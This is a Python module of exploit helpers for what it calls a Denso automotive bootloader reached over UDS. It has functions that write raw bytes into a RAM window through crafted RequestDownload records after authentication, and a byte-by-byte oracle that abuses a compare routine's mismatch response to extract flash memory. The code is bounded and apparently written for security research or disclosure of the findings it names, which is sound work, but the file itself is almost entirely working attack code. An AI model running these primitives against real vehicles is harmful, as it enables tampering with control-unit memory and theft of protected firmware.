#!/usr/bin/env python3
"""Bounded host-side helpers for MEM-SAFE-001 and MEM-SAFE-003.

These helpers do not perform session entry or SecurityAccess.  Their callers
must establish the authenticated bootloader state first; making that
precondition explicit prevents the stale-authorization primitive from being
mistaken for an initial authentication bypass.
"""

from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import Callable, Iterable

RAM_WINDOW_START = 0xFEBF0000
RAM_WINDOW_END = 0xFEBF1000
COMPARE_RANGES = ((0x00010000, 0x00017E00), (0x00018000, 0x000FFE00))
MAX_RAW_CHUNK = 15
ROUTINE_COMPARE = 0x10F3
MISMATCH_NRC = 0x10


class PrimitiveError(RuntimeError):
    pass


@dataclass(frozen=True)
class DownloadChunk:
    address: int
    data: bytes


def _contained(start: int, length: int, ranges: Iterable[tuple[int, int]]) -> bool:
    if length <= 0 or not 0 <= start <= 0xFFFFFFFF:
        return False
    end = start + length
    if end > 0x100000000 or end <= start:
        return False
    return any(lo <= start and end <= hi for lo, hi in ranges)


def validate_ram_range(address: int, length: int) -> None:
    if not _contained(address, length, ((RAM_WINDOW_START, RAM_WINDOW_END),)):
        raise PrimitiveError("raw substitution must stay inside FEBF0000..FEBF0FFF")


def validate_compare_range(address: int, length: int) -> None:
    if not _contained(address, length, COMPARE_RANGES):
        raise PrimitiveError(
            "comparison must stay in 00010000..00017DFF or 00018000..000FFDFF"
        )


def request_download_record(address: int, length: int, *, memory_id: int = 1) -> bytes:
    if not 0 <= memory_id <= 0xFF:
        raise PrimitiveError("memory_id must fit one byte")
    if length <= 0 or length > 0xFFFFFFFF or not 0 <= address <= 0xFFFFFFFF:
        raise PrimitiveError("RequestDownload address/length must be non-wrapping uint32 values")
    if address + length > 0x100000000:
        raise PrimitiveError("RequestDownload range wraps uint32")
    # Exact Denso record used by the bootloader: data-format 01, ALFID 46,
    # one-byte memory ID, reserved zero, then BE address and length.
    return b"\x01\x46" + bytes((memory_id, 0)) + struct.pack("!II", address, length)


def raw_substitution_chunks(address: int, data: bytes) -> tuple[DownloadChunk, ...]:
    validate_ram_range(address, len(data))
    return tuple(
        DownloadChunk(address + offset, data[offset : offset + MAX_RAW_CHUNK])
        for offset in range(0, len(data), MAX_RAW_CHUNK)
    )


def apply_raw_substitution(
    uds_client,
    uds_mod,
    address: int,
    data: bytes,
    *,
    prior_10f0_authenticated: bool,
    memory_id: int = 1,
) -> list[dict[str, int]]:
    """Apply raw RAM chunks after a successful 0x10F0 in this live session."""
    if not prior_10f0_authenticated:
        raise PrimitiveError("refusing raw substitution without explicit prior 0x10F0 authentication")
    events: list[dict[str, int]] = []
    for chunk in raw_substitution_chunks(address, data):
        record = request_download_record(chunk.address, len(chunk.data), memory_id=memory_id)
        uds_client._uds_request(uds_mod.SERVICE_TYPE.REQUEST_DOWNLOAD, data=record)
        uds_client.transfer_data(1, chunk.data)
        uds_client.request_transfer_exit()
        events.append({"address": chunk.address, "length": len(chunk.data)})
    return events


def compare_byte(uds_client, uds_mod, address: int, guess: int, *, memory_id: int = 1) -> bool:
    """Return True on equality and False only for the exact mismatch NRC 0x10."""
    validate_compare_range(address, 1)
    if not 0 <= guess <= 0xFF:
        raise PrimitiveError("byte guess must fit uint8")
    uds_client.routine_control(uds_mod.ROUTINE_CONTROL_TYPE.START, ROUTINE_COMPARE)
    record = request_download_record(address, 1, memory_id=memory_id)
    uds_client._uds_request(uds_mod.SERVICE_TYPE.REQUEST_DOWNLOAD, data=record)
    try:
        uds_client.transfer_data(1, bytes((guess,)))
    except Exception as exc:
        if getattr(exc, "error_code", None) == MISMATCH_NRC:
            return False
        raise PrimitiveError(f"unexpected comparison response: {exc}") from exc
    uds_client.request_transfer_exit()
    return True


def extract_with_oracle(
    query: Callable[[int, int], bool],
    address: int,
    length: int,
    *,
    max_requests: int,
) -> tuple[bytes, int]:
    """Extract a bounded range with a caller-supplied equality query."""
    validate_compare_range(address, length)
    if max_requests <= 0:
        raise PrimitiveError("max_requests must be positive")
    output = bytearray()
    requests = 0
    for offset in range(length):
        found = None
        for guess in range(256):
            if requests >= max_requests:
                raise PrimitiveError(
                    f"oracle request budget exhausted after {requests} attempts and {len(output)} bytes"
                )
            requests += 1
            if query(address + offset, guess):
                found = guess
                break
        if found is None:
            raise PrimitiveError(f"oracle returned no equality for address 0x{address + offset:08X}")
        output.append(found)
    return bytes(output), requests
